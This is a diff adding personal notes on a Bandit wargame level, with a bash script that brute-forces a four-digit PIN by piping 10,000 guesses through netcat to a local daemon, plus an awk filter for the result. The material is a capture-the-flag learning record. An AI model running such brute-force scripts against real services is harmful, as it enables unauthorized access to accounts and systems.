@@ -267,3 +267,33 @@ cp exploit.sh /var/spool/bandit24/foo/
 
 cat /tmp/bandit24_exploit/flag.txt
 ```
+
+
+### level 24 -> level 25
+
+learnt how to make a small brute force script against a listening daemon on a specified port via netcat.
+
+```bash
+
+#!/bin/bash
+
+# make sure the location of this script is in the same dir as test.txt
+mkdir -p /tmp/bruteforcingRAWR
+touch /tmp/bruteforcingRAWR/test.txt
+
+PINS="/tmp/bruteforcingRAWR/test.txt"
+CURR_PASS="$(cat /etc/bandit_pass/bandit24)"
+
+for i in {0000..9999}; do
+  echo "$CURR_PASS $i" >> $PINS
+done
+
+cat $PINS | nc localhost 30002
+```
+
+make the script executable, and use awk to filter out previous failed attempts
+
+```bash
+chmod +x solve25.sh
+./solve25.sh | awk '/The password of/ {print $NF}'
+```
